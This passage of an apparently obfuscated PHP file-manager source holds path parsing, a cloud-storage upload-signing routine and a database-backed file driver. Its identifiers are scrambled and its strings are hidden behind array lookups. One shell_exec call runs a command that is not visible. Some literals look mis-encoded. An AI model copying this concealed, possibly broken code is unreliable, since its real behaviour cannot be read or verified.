"\x7b\x75\163\145\x72\123\x68\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\x72\123\150\141\162\x65\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\162\x65\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\150\x61\162\145\x49\x74\145\x6d\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\173\x73\145\x61\x72\x63\150\175"; const KOD_BLOCK = "\173\x62\x6c\157\x63\x6b\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\122\x65\x6e\143\145\156\x74\175"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\x65\x72\175"; public static function typeList() { $Ó‡õ·²· =& $_SERVER[¯µç›È¢]; return array($Ó‡õ·²·[1254] => self::KOD_SOURCE, $Ó‡õ·²·[1255] => self::KOD_USER_RECYCLE, $Ó‡õ·²·[1256] => self::KOD_USER_FAV, $Ó‡õ·²·[1257] => self::KOD_USER_FILE_TAG, $Ó‡õ·²·[1258] => self::KOD_USER_FILE_TYPE, $Ó‡õ·²·[1259] => self::KOD_GROUP_ROOT_SELF, $Ó‡õ·²·[1260] => self::KOD_USER_SHARE, $Ó‡õ·²·[1261] => self::KOD_USER_SHARE_LINK, $Ó‡õ·²·[1262] => self::KOD_USER_SHARE_TO_ME, $Ó‡õ·²·[1263] => self::KOD_SHARE_ITEM, $Ó‡õ·²·[1264] => self::KOD_SHARE_LINK, $Ó‡õ·²·[1265] => self::KOD_SEARCH, $Ó‡õ·²·[1266] => self::KOD_BLOCK, $Ó‡õ·²·[1267] => self::KOD_IO, $Ó‡õ·²·[1268] => self::KOD_USER_RECENT, $Ó‡õ·²·[1269] => self::KOD_USER_DRIVER); } public static function parse($İçƒ·‡¡) { $ó”—„Öè =& $_SERVER[¯µç›È¢]; $İçƒ·‡¡ = self::clear($İçƒ·‡¡); $óÜûà¤ã = array_values(self::typeList()); preg_match($ó”—„Öè[1270], $İçƒ·‡¡, $õ§íŠ×); $¾ ¤øúâ = array($ó”—„Öè[428] => !1, $ó”—„Öè[1271] => !1, $ó”—„Öè[425] => !1, $ó”—„Öè[88] => $İçƒ·‡¡, $ó”—„Öè[1180] => !1, $ó”—„Öè[1179] => $ó”—„Öè[12]); if (is_array($õ§íŠ×) && count($õ§íŠ×) == 5) { $º¯‹Ûî´ = $ó”—„Öè[1272] . $õ§íŠ×[2] . $ó”—„Öè[335]; if (in_array($º¯‹Ûî´, $óÜûà¤ã)) { $¾ ¤øúâ[$ó”—„Öè[1180]] = $õ§íŠ×[1]; $¾ ¤øúâ[$ó”—„Öè[33]] = $º¯‹Ûî´; $¾ ¤øúâ[$ó”—„Öè[1273]] = substr($º¯‹Ûî´, 1, -1); $¾ ¤øúâ[$ó”—„Öè[405]] = $õ§íŠ×[3]; } $¾ ¤øúâ[$ó”—„Öè[1179]] = $õ§íŠ×[4]; } $§™Šıï = array($ó”—„Öè[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $¾ ¤øúâ[$ó”—„Öè[1235]] = in_array($¾ ¤øúâ[$ó”—„Öè[33]], $§™Šıï); return $¾ ¤øúâ; } public static function isTruePath($ı¡ƒàÆ·) { $â¹òÎ› =& $_SERVER[¯µç›È¢]; if (substr($ı¡ƒàÆ·, 0, 1) != $â¹òÎ›[1272]) { return !0; } if (strpos($ı¡ƒàÆ·, $â¹òÎ›[414]) === 0) { return !0; } if (strpos($ı¡ƒàÆ·, $â¹òÎ›[1239]) === 0) { return !0; } if (strpos($ı¡ƒàÆ·, $â¹òÎ›[1274]) === 0) { return !0; } if (strpos($ı¡ƒàÆ·, $â¹òÎ›[1275]) === 0) { return !0; } if (strpos($ı¡ƒàÆ·, $â¹òÎ›[1276]) === 0) { return !0; } return !1; } public static function clear($º¾Æ«–) { $¼ú¿ â½ =& $_SERVER[¯µç›È¢]; $º¾Æ«– = str_replace(array($¼ú¿ â½[1090], $¼ú¿ â½[66]), $¼ú¿ â½[53], $º¾Æ«–); $º¾Æ«– = str_replace($¼ú¿ â½[108], $¼ú¿ â½[8], $º¾Æ«–); $¨Ñèüˆ = $¼ú¿ â½[1277]; if (substr($º¾Æ«–, 0, 3) == $¼ú¿ â½[1278]) { $º¾Æ«– = substr($º¾Æ«–, 3); } while (strstr($º¾Æ«–, $¨Ñèüˆ)) { $º¾Æ«– = str_replace($¨Ñèüˆ, $¼ú¿ â½[8], $º¾Æ«–); } $º¾Æ«– = preg_replace($¼ú¿ â½[1279], $¼ú¿ â½[8], $º¾Æ«–); if ($º¾Æ«– == $¼ú¿ â½[8]) { return $¼ú¿ â½[8]; } $º¾Æ«– = rtrim($º¾Æ«–, $¼ú¿ â½[8]); return $º¾Æ«–; } public static function sourceID($æß¼›‹) { $Í¨æ­Õ‹ =& $_SERVER[¯µç›È¢]; $¹øˆã‚Æ = self::parse($æß¼›‹); if ($¹øˆã‚Æ[$Í¨æ­Õ‹[33]] !== self::KOD_SOURCE) { show_json(LNG($Í¨æ­Õ‹[1280]), !1); } return $¹øˆã‚Æ[$Í¨æ­Õ‹[405]]; } public static function make($¾§…Õö) { if (!$¾§…Õö) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¾§…Õö)); } public static function makeShare($ÜıÃæ²ğ, $ÔâÛ¢í) { return self::makePath(self::KOD_SHARE_ITEM, $ÜıÃæ²ğ, $ÔâÛ¢í); } public static function makeFileTypePath($“ĞÙÀüµ) { return self::makePath(self::KOD_USER_FILE_TYPE, $“ĞÙÀüµ); } public static function makeFileTagPath($şß—¡Í‚) { return self::makePath(self::KOD_USER_FILE_TAG, $şß—¡Í‚); } public static function makePath($¦¢ñí’›, $ËÒĞôá = '', $—è–ìœÜ = '') { $şı‚ù²ü =& $_SERVER[¯µç›È¢]; $î®“º¶ = substr($¦¢ñí’›, 1, -1); $³ñ™ÌÄ± = $şı‚ù²ü[1281] . $î®“º¶ . $şı‚ù²ü[1282] . $ËÒĞôá . $şı‚ù²ü[1283]; $³ñ™ÌÄ± = $—è–ìœÜ ? $³ñ™ÌÄ± . $—è–ìœÜ . $şı‚ù²ü[8] : $³ñ™ÌÄ±; return $³ñ™ÌÄ±; } public static function hashPath($ŠÓ÷¢ôÌ, $¾ô¶¢ÆÀ = true) { $Îú…º¥¨ =& $_SERVER[¯µç›È¢]; $£·ÅóÓ§ = is_array($ŠÓ÷¢ôÌ) ? $ŠÓ÷¢ôÌ : IO::info($ŠÓ÷¢ôÌ); $Õûã‡­ = _get($£·ÅóÓ§, $Îú…º¥¨[1284], $Îú…º¥¨[12]); if (!$Õûã‡­ && isset($£·ÅóÓ§[$Îú…º¥¨[408]])) { $£·ÅóÓ§ = IO::info(KodIO::make($£·ÅóÓ§[$Îú…º¥¨[408]])); $Õûã‡­ = _get($£·ÅóÓ§, $Îú…º¥¨[1284], $Îú…º¥¨[12]); } if (!$Õûã‡­ && $¾ô¶¢ÆÀ) { $•Ö˜í¶ø = KodIO::parse($£·ÅóÓ§[$Îú…º¥¨[88]]); if (!$•Ö˜í¶ø[$Îú…º¥¨[33]]) { $Õûã‡­ = IO::hashSimple($£·ÅóÓ§[$Îú…º¥¨[88]]); } } if (!$Õûã‡­) { $Õûã‡­ = md5($£·ÅóÓ§[$Îú…º¥¨[88]] . $£·ÅóÓ§[$Îú…º¥¨[90]] . $£·ÅóÓ§[$Îú…º¥¨[96]]); } return $Õûã‡­; } public static function initSystemPath() { $éáî­º =& $_SERVER[¯µç›È¢]; if (defined($éáî­º[1285])) { return; } define($éáî­º[1285], self::systemPath($éáî­º[1286])); define($éáî­º[1287], self::systemPath($éáî­º[1288])); define($éáî­º[1289], self::systemPath($éáî­º[1290])); define($éáî­º[1291], self::systemPath($éáî­º[1292])); IOHistory::bindEvent(); } public static function systemPath($„ŠïÅÖÉ) { $Åš¿Ïö‰ =& $_SERVER[¯µç›È¢]; $íêêÛûÕ = $Åš¿Ïö‰[1293] . ucfirst($„ŠïÅÖÉ); $‡ÒõÉÎä = Model($Åš¿Ïö‰[787])->get($íêêÛûÕ); if ($‡ÒõÉÎä) { return $‡ÒõÉÎä; } if ($„ŠïÅÖÉ == $Åš¿Ïö‰[1286]) { $‡ÒõÉÎä = self::make(Model($Åš¿Ïö‰[842])->systemRootPathAdd($Åš¿Ïö‰[545])); } else { $‡ÒõÉÎä = self::systemPath($Åš¿Ïö‰[1286]); $ÆÊÕÍÂÒ = self::sourceID($‡ÒõÉÎä); $‡ÒõÉÎä = self::make(Model($Åš¿Ïö‰[842])->mkdir($ÆÊÕÍÂÒ, $„ŠïÅÖÉ)); } Model($Åš¿Ïö‰[787])->set($íêêÛûÕ, $‡ÒõÉÎä); return $‡ÒõÉÎä; } public static function systemFolder($±Ò›“¾•) { $°£º¿¦ï = IO_PATH_SYSTEM_SOURCE . $±Ò›“¾•; $ßøıü˜Ë = Cache::get($°£º¿¦ï); if (!$ßøıü˜Ë) { $µä›ÊïÕ = IO::infoFull($°£º¿¦ï); if (!$µä›ÊïÕ) { $ßøıü˜Ë = IO::mkdir($°£º¿¦ï, REPEAT_SKIP); } else { $ßøıü˜Ë = $µä›ÊïÕ[$_SERVER[¯µç›È¢][88]]; } Cache::set($°£º¿¦ï, $ßøıü˜Ë, 3600 * 10); } return $ßøıü˜Ë; } public static function defaultDriver() { return Model($_SERVER[¯µç›È¢][784])->defaultDriver(); } public static function defaultIO() { $Í±½°”Æ =& $_SERVER[¯µç›È¢]; $“˜öóíî = self::defaultDriver(); return $Í±½°”Æ[1294] . $“˜öóíî[$Í±½°”Æ[405]] . $Í±½°”Æ[1283]; } public static function defaultDriverInit() { static $•ˆ‡§ÅÔ = false; if ($•ˆ‡§ÅÔ) { return $•ˆ‡§ÅÔ; } $•ˆ‡§ÅÔ = IO::init(self::defaultIO()); return $•ˆ‡§ÅÔ; } public static function fileTypeList() { $¶Áß˜ÀÙ =& $_SERVER[¯µç›È¢]; $‰¡©Õ¿¨ = $GLOBALS[$¶Áß˜ÀÙ[6]][$¶Áß˜ÀÙ[1295]]; foreach ($‰¡©Õ¿¨ as $ŞŠÒ·Ş => $Óöïû“¸) { $…Ñö¯®· = $¶Áß˜ÀÙ[1296] . $ŞŠÒ·Ş; $ìıøÛ·› = LNG($…Ñö¯®·); if ($…Ñö¯®· != $ìıøÛ·›) { $‰¡©Õ¿¨[$ŞŠÒ·Ş][$¶Áß˜ÀÙ[32]] = $ìıøÛ·›; } } return $‰¡©Õ¿¨; } public static function diskList($¸˜­âÆ³ = true) { $¹Õ‚ø»ª = $_SERVER[¯µç›È¢][1297]; if ($¸˜­âÆ³) { $àÜÀûúğ = Cache::get($¹Õ‚ø»ª); if (is_array($àÜÀûúğ)) { return $àÜÀûúğ; } } $àÜÀûúğ = self::diskListGet(); Cache::set($¹Õ‚ø»ª, $àÜÀûúğ, 60); return $àÜÀûúğ; } public static function diskListGet() { $¾Ğ‚ü°Î =& $_SERVER[¯µç›È¢]; $µ•Ô‘¯« = array(); if ($GLOBALS[$¾Ğ‚ü°Î[6]][$¾Ğ‚ü°Î[1298]] == $¾Ğ‚ü°Î[1299]) { $»Âãôâ¯ = $¾Ğ‚ü°Î[1300]; for ($÷æ€µ–´ = 0; $÷æ€µ–´ < strlen($»Âãôâ¯); $÷æ€µ–´++) { $ÂëŠôûÙ = $»Âãôâ¯[$÷æ€µ–´] . $¾Ğ‚ü°Î[1301]; if (file_exists($ÂëŠôûÙ)) { $µ•Ô‘¯«[] = $ÂëŠôûÙ; } } return $µ•Ô‘¯«; } if (!function_exists($¾Ğ‚ü°Î[109])) { $µ•Ô‘¯«[] = $¾Ğ‚ü°Î[852]; return $µ•Ô‘¯«; } $‚—œâ·³ = explode($¾Ğ‚ü°Î[66], shell_exec($¾Ğ‚ü°Î[1302])); array_shift($‚—œâ·³); array_pop($‚—œâ·³); $ØİÉ­®í = array($¾Ğ‚ü°Î[1303], $¾Ğ‚ü°Î[1304], $¾Ğ‚ü°Î[1305], $¾Ğ‚ü°Î[1306], $¾Ğ‚ü°Î[1307], $¾Ğ‚ü°Î[1308], $¾Ğ‚ü°Î[1309], $¾Ğ‚ü°Î[1310]); foreach ($‚—œâ·³ as $¥¹ı·×) { $ø…ßöÇí = preg_split($¾Ğ‚ü°Î[1311], $¥¹ı·×); $ÂëŠôûÙ = $ø…ßöÇí[count($ø…ßöÇí) - 1]; if (!strstr($ø…ßöÇí[0], $¾Ğ‚ü°Î[1312]) || !$ÂëŠôûÙ) { continue; } $„İœÚ = rtrim($ÂëŠôûÙ, $¾Ğ‚ü°Î[8]) . $¾Ğ‚ü°Î[8]; if (in_array($„İœÚ, $ØİÉ­®í)) { continue; } $µ•Ô‘¯«[] = $„İœÚ; } return $µ•Ô‘¯«; } public static function isSameDisk($•»Üç½, $çÁı­µÆ) { $Áı½¯·è =& $_SERVER[¯µç›È¢]; if ($GLOBALS[$Áı½¯·è[6]][$Áı½¯·è[1298]] == $Áı½¯·è[1299]) { return strtolower(substr($•»Üç½, 0, 1)) == strtolower(substr($çÁı­µÆ, 0, 1)); } $íŠæ ç¯ = self::diskList(); $×»ó„™ş = !1; $ĞŸÉ‹à = !1; sort($íŠæ ç¯); $íŠæ ç¯ = array_reverse($íŠæ ç¯); $•»Üç½ = rtrim($•»Üç½, $Áı½¯·è[8]) . $Áı½¯·è[8]; $çÁı­µÆ = rtrim($çÁı­µÆ, $Áı½¯·è[8]) . $Áı½¯·è[8]; foreach ($íŠæ ç¯ as $ê™£ëºæ) { $»¶ëå»“ = strlen($ê™£ëºæ); if (!$×»ó„™ş && substr($•»Üç½, 0, $»¶ëå»“) == $ê™£ëºæ) { $×»ó„™ş = $ê™£ëºæ; } if (!$ĞŸÉ‹à && substr($çÁı­µÆ, 0, $»¶ëå»“) == $ê™£ëºæ) { $ĞŸÉ‹à = $ê™£ëºæ; } if ($×»ó„™ş && $ĞŸÉ‹à) { break; } } return $×»ó„™ş === $ĞŸÉ‹à; } public static function transferType($»”Ş¤¤Ô, $ıô†ˆØÕ) { $È‡¨¯œÒ =& $_SERVER[¯µç›È¢]; $•·‹Ò÷í = self::driverType($»”Ş¤¤Ô); $ê¡İ†ĞÅ = self::driverType($ıô†ˆØÕ); if ($•·‹Ò÷í[$È‡¨¯œÒ[33]] == $ê¡İ†ĞÅ[$È‡¨¯œÒ[33]] && $•·‹Ò÷í[$È‡¨¯œÒ[1313]] == $ê¡İ†ĞÅ[$È‡¨¯œÒ[1313]]) { return $È‡¨¯œÒ[1314]; } if ($•·‹Ò÷í[$È‡¨¯œÒ[33]] == $È‡¨¯œÒ[881] && $ê¡İ†ĞÅ[$È‡¨¯œÒ[33]] == $È‡¨¯œÒ[117]) { return $È‡¨¯œÒ[1209]; } if ($•·‹Ò÷í[$È‡¨¯œÒ[33]] == $È‡¨¯œÒ[117] && $ê¡İ†ĞÅ[$È‡¨¯œÒ[33]] == $È‡¨¯œÒ[881]) { return $È‡¨¯œÒ[118]; } return $È‡¨¯œÒ[1315]; } public static function driverType($ªãÏÓÛ) { $„”éÕÃó =& $_SERVER[¯µç›È¢]; $Æü  ˜¿ = str_replace($„”éÕÃó[1316], $„”éÕÃó[12], strtolower($ªãÏÓÛ->getType())); if ($Æü  ˜¿ == $„”éÕÃó[775] || $Æü  ˜¿ == $„”éÕÃó[1317] || $Æü  ˜¿ == $„”éÕÃó[1318]) { $ªãÏÓÛ = self::defaultDriverInit(); } else { if ($Æü  ˜¿ == $„”éÕÃó[1216] || $Æü  ˜¿ == $„”éÕÃó[1319]) { $ªãÏÓÛ = IO::init($ªãÏÓÛ->pathParse[$„”éÕÃó[1163]]); } } $º’²¾óÄ = $ªãÏÓÛ->path; $Æü  ˜¿ = str_replace($„”éÕÃó[1316], $„”éÕÃó[12], strtolower($ªãÏÓÛ->getType())); if ($Æü  ˜¿ == $„”éÕÃó[117]) { return array($„”éÕÃó[33] => $„”éÕÃó[117], $„”éÕÃó[1313] => $„”éÕÃó[12], $„”éÕÃó[88] => $º’²¾óÄ); } return array($„”éÕÃó[33] => $„”éÕÃó[881], $„”éÕÃó[1313] => $ªãÏÓÛ->pathDriver, $„”éÕÃó[88] => $º’²¾óÄ); } public static function pathDriverType($…–šÛÈ÷) { return $…–šÛÈ÷ ? self::driverType(IO::init($…–šÛÈ÷)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($¡ù›é«Ó) { parent::__construct($¡ù›é«Ó); $this->signatureVersion($_SERVER[¯µç›È¢][225]); } public function uploadFormData($Ï¡Îù , $Ì½ÊäîË = 3600) { $ùšî„í =& $_SERVER[¯µç›È¢]; $¢øµé = $ùšî„í[205]; $â÷èÕÀ = $ùšî„í[240]; $®œé€ù‚ = $ùšî„í[1320]; $ç³é † = gmdate($ùšî„í[1321], time() + $Ì½ÊäîË); $ÑÕ×ÍÑ† = (string) time() . $ùšî„í[81] . (string) (time() + $Ì½ÊäîË); $ŠØ¸Ó€ = array($ùšî„í[1322] => $ç³é †, $ùšî„í[1323] => array(array($ùšî„í[1324] => $¢øµé), array($ùšî„í[1325] => $this->bucket), array($ùšî„í[1326], $ùšî„í[1327], $ùšî„í[12]), array($ùšî„í[1328] => $®œé€ù‚), array($ùšî„í[1329] => $â÷èÕÀ), array($ùšî„í[1330] => $this->accessKey), array($ùšî„í[1331] => $ÑÕ×ÍÑ†))); $ŠØ¸Ó€ = json_encode($ŠØ¸Ó€); $¢ÓÜì†Ï = hash_hmac($ùšî„í[240], $ÑÕ×ÍÑ†, $this->secret); $Ö‘ûŸ’’ = sha1($ŠØ¸Ó€); $Õ²ª˜¤Ë = hash_hmac($ùšî„í[240], $Ö‘ûŸ’’, $¢ÓÜì†Ï); $Ñô¿Ÿæü = array($ùšî„í[1324] => $¢øµé, $ùšî„í[1328] => $®œé€ù‚, $ùšî„í[1332] => base64_encode($ŠØ¸Ó€), $ùšî„í[1329] => $â÷èÕÀ, $ùšî„í[1330] => $this->accessKey, $ùšî„í[1333] => $ÑÕ×ÍÑ†, $ùšî„í[1334] => $Õ²ª˜¤Ë, $ùšî„í[188] => $this->getHost()); return $Ñô¿Ÿæü; } public function fileOutLink($°ï“Æå™) { $æ»ìåÑÇ =& $_SERVER[¯µç›È¢]; if (substr($°ï“Æå™, 0, 7) == $æ»ìåÑÇ[1335]) { $°ï“Æå™ = $æ»ìåÑÇ[1336] . substr($°ï“Æå™, 7); } header($æ»ìåÑÇ[172] . $°ï“Æå™); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($ƒ…©şİˆ) { $this->pathParse = $ƒ…©şİˆ; $this->model = Model($_SERVER[¯µç›È¢][1337]); } public function getPath($Ïş¸ó Ò) { return trim($Ïş¸ó Ò, $_SERVER[¯µç›È¢][8]); } public function pathFather($óï¸ôÂ) { $†š®ôë™ = $this->parse($óï¸ôÂ); $†š®ôë™ = $this->infoSimple($óï¸ôÂ); return $†š®ôë™ ? $†š®ôë™[$_SERVER[¯µç›È¢][503]] : !1; } public function pathThis($“û£¼÷¯) { $—éğğ¶ˆ = $this->infoSimple($“û£¼÷¯); return $—éğğ¶ˆ ? $—éğğ¶ˆ[$_SERVER[¯µç›È¢][32]] : !1; } public function getPathOuter($ïÜœ‡´¿) { if (!$ïÜœ‡´¿) { return $ïÜœ‡´¿; } $¨ÄÓàÏ = $this->parse($ïÜœ‡´¿); return KodIO::make($¨ÄÓàÏ[$_SERVER[¯µç›È¢][405]]); } public function copyFolderFromIO($Ë×®Ê•Ç, $ñÉ£ü¦, $ñŞ«üßÉ, $Ó’™şšı, $·öÅÀš») { $¼Â±±¾‡ = $this->model->copyFolderFromIO($Ë×®Ê•Ç, $ñÉ£ü¦, $ñŞ«üßÉ, $Ó’™şšı, $·öÅÀš»); return KodIO::make($¼Â±±¾‡); } public function isParentOf($á×†šŸ, $Üö§Œ¹ô) { return $this->model->isParentOf($á×†šŸ, $Üö§Œ¹ô); } public function mkfile($É†è³‰Ö, $à¸ÑÜ·º = '', $õçÆ¯œ† = REPEAT_RENAME) { $™‘˜çôÁ =& $_SERVER[¯µç›È¢]; $¢Ïµ§ = $this->parse($É†è³‰Ö); $É†è³‰Ö = $¢Ïµ§[$™‘˜çôÁ[405]]; for ($¿‰“ûë€ = 0; $¿‰“ûë€ < count($¢Ïµ§[$™‘˜çôÁ[1338]]); $¿‰“ûë€++) { $Á¿ÑÄã = $¢Ïµ§[$™‘˜çôÁ[1338]][$¿‰“ûë€]; if ($¿‰“ûë€ == count($¢Ïµ§[$™‘˜çôÁ[1338]]) - 1) { $É†è³‰Ö = $this->model->mkfile($É†è³‰Ö, $Á¿ÑÄã, $à¸ÑÜ·º, $õçÆ¯œ†); break; } $É†è³‰Ö = $this->model->mkdir($É†è³‰Ö, $Á¿ÑÄã, REPEAT_SKIP); } return $this->getPathOuter($É†è³‰Ö); } public function mkdir($«ÅƒË, $´€èú¬¬ = REPEAT_SKIP) { $Ã™ØîÊ =& $_SERVER[¯µç›È¢]; $ÇßÍïÕ = $this->parse($«ÅƒË); $«ÅƒË = $ÇßÍïÕ[$Ã™ØîÊ[405]]; for ($…şğºã˜ = 0; $…şğºã˜ < count($ÇßÍïÕ[$Ã™ØîÊ[1338]]); $…şğºã˜++) { $éÎ•†Ş¿ = $ÇßÍïÕ[$Ã™ØîÊ[1338]][$…şğºã˜]; $«ÅƒË = $this->model->mkdir($«ÅƒË, $éÎ•†Ş¿, $´€èú¬¬); } return $this->getPathOuter($«ÅƒË); } public function copyFile($î„ùúÕ¸, $·¸‰®ë‰, $ôÃšŒ±† = REPEAT_REPLACE) { $‚¿ïç =& $_SERVER[¯µç›È¢]; $ÔÔá½³ = $this->parse($·¸‰®ë‰); $â©Ú¯Â™ = $this->model->copy($î„ùúÕ¸, $ÔÔá½³[$‚¿ïç[405]], $ôÃšŒ±†, $ÔÔá½³[$‚¿ïç[88]]); return $â©Ú¯Â™ ? $this->getPathOuter($â©Ú¯Â™) : !1; } public function moveFile($¦ø¯­‹, $œŞÜá²†, $İ«üŸÜî = REPEAT_REPLACE) { $ï–ØÙ« =& $_SERVER[¯µç›È¢]; $È„úÑş– = $this->parse($œŞÜá²†); $©®‘«İæ = $this->model->move($¦ø¯­‹, $È„úÑş–[$ï–ØÙ«[405]], $İ«üŸÜî, $È„úÑş–[$ï–ØÙ«[88]]); return $©®‘«İæ ? $this->getPathOuter($©®‘«İæ) : !1; } public function copy($¢èÌñ, $å®Çª‰¶, $¨£ÑÆ³š = REPEAT_REPLACE, $†¢èüÄì = false) { $­Å÷Â¥ = $this->parse($å®Çª‰¶); $éªè¯Şˆ = $this->model->copy($¢èÌñ, $­Å÷Â¥[$_SERVER[¯µç›È¢][405]], $¨£ÑÆ³š, $†¢èüÄì); return $éªè¯Şˆ ? $this->getPathOuter($éªè¯Şˆ) : !1; } public function moveSameAllow() { } public function move($€ŸŠŠ×Ñ, $¡ÄÛÕ‘Ö, $±ÊşÈÅ = REPEAT_REPLACE, $›º¯ª€æ = false) { $™«à‹¨ = $this->parse($¡ÄÛÕ‘Ö); $“í™É›¬ = $this->model->move($€ŸŠŠ×Ñ, $™«à‹¨[$_SERVER[¯µç›È¢][405]], $±ÊşÈÅ, $›º¯ª€æ); return $“í™É›¬ ? $this->getPathOuter($“í™É›¬) : !1; } public function remove($®£ÔÛØÚ, $£Ù—ñç“ = true) { return $this->model->remove($®£ÔÛØÚ, $£Ù—ñç“); } public function rename($Üòö±İ, $òÅ§çº”) { $¤–¦ò = $this->model->rename($Üòö±İ, $òÅ§çº”); return $¤–¦ò ? $this->getPathOuter($Üòö±İ) : $¤–¦ò; } public function size($•Çğ¾) { $ ‘½Úöù = $this->infoSimple($•Çğ¾); return $ ‘½Úöù ? $ ‘½Úöù[$_SERVER[¯µç›È¢][90]] : 0; } public function infoSimple($½¨ğû¡Â) { return $this->model->sourceInfo($½¨ğû¡Â); } public function info($®¸¹Âä) { return $this->infoParse($®¸¹Âä); } public function infoAuth($÷†ï‘æÈ) { return $this->infoParse($÷†ï‘æÈ, !1, !0); } public function infoWithChildren($âœ…Ø‰Š) { return $this->infoParse($âœ…Ø‰Š, !0); } protected function infoParse($‚é«Í›œ, $ğ° §èó = false, $«Î†ïŸ¨ = false) { if (!$ğ° §èó) { return $this->model->pathInfo($‚é«Í›œ, $«Î†ïŸ¨); } return $this->model->pathInfoMore($‚é«Í›œ); } public function infoFull($×ƒ¡º×ñ) { $ø‘õù¿É =& $_SERVER[¯µç›È¢]; $şØ—®ïÙ = explode($ø‘õù¿É[8], $×ƒ¡º×ñ); $óôËã‡Ÿ = implode($ø‘õù¿É[8], array_splice($şØ—®ïÙ, 1)); return $this->model->pathInfoByPath($şØ—®ïÙ[0], $óôËã‡Ÿ); } public function hashSimple($¥ıçÅÈ•) { $¼×Æû­€ =& $_SERVER[¯µç›È¢]; $ßò—‰¼× = $this->infoWithChildren($¥ıçÅÈ•); return $ßò—‰¼×[$¼×Æû­€[177]][$¼×Æû­€[184]]; } public function hashMd5($¡Ä€ÌÅ¿) { $¬‹è­è =& $_SERVER[¯µç›È¢]; $çû“õÍ = $this->infoWithChildren($¡Ä€ÌÅ¿); return $çû“õÍ[$¬‹è­è[177]][$¬‹è­è[183]]; } public function exist($¾ø¿Ñşã) { $Ñ¹åËÁü =& $_SERVER[¯µç›È¢]; $„¯ïî‘Ö = $this->parse($¾ø¿Ñşã); if (!$„¯ïî‘Ö[$Ñ¹åËÁü[88]]) { return $this->isFile($¾ø¿Ñşã) || $this->isFolder($¾ø¿Ñşã); } $÷ÍÁ¹´™ = array($Ñ¹åËÁü[407] => $„¯ïî‘Ö[$Ñ¹åËÁü[405]], $Ñ¹åËÁü[32] => $„¯ïî‘Ö[$Ñ¹åËÁü[88]]); $ç™ĞçÌó = $this->model->where($÷ÍÁ¹´™)->find(); return $ç™ĞçÌó ? !0 : !1; } public function isFile($—÷öÂ¥Ë) { $ñÖõ†™ =& $_SERVER[¯µç›È¢]; $¥˜º÷îË = $this->infoSimple($—÷öÂ¥Ë); return $¥˜º÷îË && $¥˜º÷îË[$ñÖõ†™[416]] == $ñÖõ†™[99] ? !1 : !0; } public function isFolder($À×ëÃÚß) { $¤Á¼æØ =& $_SERVER[¯µç›È¢]; $ŸÙÀŞŞ± = $this->infoSimple($À×ëÃÚß); return $ŸÙÀŞŞ± && $ŸÙÀŞŞ±[$¤Á¼æØ[416]] == $¤Á¼æØ[99] ? !0 : !1; } public function listPath($ô´ìù, $±Ñ´şò = false) { $ò™úÑÆÖ =& $_SERVER[¯µç›È¢]; if ($ô´ìù == $ò™úÑÆÖ[12]) { return !1; } $óÖŸí‰ = array($ò™úÑÆÖ[407] => $ô´ìù); if ($±Ñ´şò) { return $this->model->listSource($óÖŸí‰, -1); } return $this->model->listSource($óÖŸí‰); } public function has($Íá¼¼¿Ë, $ó„÷°ï¦ = false, $™Ì›øÑş = null) { $ãá®µ°® =& $_SERVER[¯µç›È¢]; $³®ÛèÉØ = $this->infoWithChildren($Íá¼¼¿Ë); if ($ó„÷°ï¦) { return array($ãá®µ°®[217] => $³®ÛèÉØ[$ãá®µ°®[217]], $ãá®µ°®[216] => $³®ÛèÉØ[$ãá®µ°®[216]]); } return $™Ì›øÑş ? $³®ÛèÉØ[$ãá®µ°®[217]] : $³®ÛèÉØ[$ãá®µ°®[216]]; } public function listAll($ÊÌºÄø€) { $Îîíñ´ = IO::info($this->pathParse[$_SERVER[¯µç›È¢][88]]); if (!$Îîíñ´) { return array(); } return $this->model->listAll($ÊÌºÄø€); } public function getContent($¶…Œ÷“Ğ) { return $this->model->getContent($¶…Œ÷“Ğ); } public function setContent($Ì¥ˆí¿ô, $®ñ¼ìÕá = '') { return $this->model->setContent($Ì¥ˆí¿ô, $®ñ¼ìÕá); } public function fileSubstr($Ú³ÛéËŸ, $îçí»µà, $°ëìÍ„ø) { return $this->model->fileSubstr($Ú³ÛéËŸ, $îçí»µà, $°ëìÍ„ø); } public function download($ÈˆøıÓº, $Òû•Œ”ô = '') { $á’‚š¬ = get_path_father($Òû•Œ”ô); $ÛÌ…›ø„ = get_path_this($Òû•Œ”ô); $ŸÏ£ø½‰ = $this->model->fileInfoGet($ÈˆøıÓº); $º¦¢ê = IO::copy($ŸÏ£ø½‰[$_SERVER[¯µç›È¢][88]], $á’‚š¬, !1, $ÛÌ…›ø„); return $º¦¢ê; } public function setModifyTime($öü¨õ¯½, $àÓËîà = '') { $¯ç£Ã› =& $_SERVER[¯µç›È¢]; if (!$öü¨õ¯½) { return; } $this->model->where(array($¯ç£Ã›[423] => $öü¨õ¯½))->save(array($¯ç£Ã›[96] => $àÓËîà)); } public function upload($Û‚Åä, $äÛ¹µğ², $£«ƒ¼´è = false, $éş†¯¥Ê = REPEAT_REPLACE) { $°ı†ÚÑª =& $_SERVER[¯µç›È¢]; $é‹é–¾ü = $this->parse($Û‚Åä); $…“•…ÊÑ = $this->model->addFile($é‹é–¾ü[$°ı†ÚÑª[405]], $äÛ¹µğ², $é‹é–¾ü[$°ı†ÚÑª[88]], $£«ƒ¼´è, $éş†¯¥Ê); return $this->getPathOuter($…“•…ÊÑ); } public function uploadFileByID($Ñê ³É«, $æ¶ÆÇ¥Ê, $éÙİ½ãé) { $„›–“ÄŸ =& $_SERVER[¯µç›È¢]; $–ôİ¡˜ = $this->parse($Ñê ³É«); $Œ—¾ÔŒ· = $this->model->addFileByFileID($–ôİ¡˜[$„›–“ÄŸ[405]], $æ¶ÆÇ¥Ê, $–ôİ¡˜[$„›–“ÄŸ[88]], $éÙİ½ãé); return 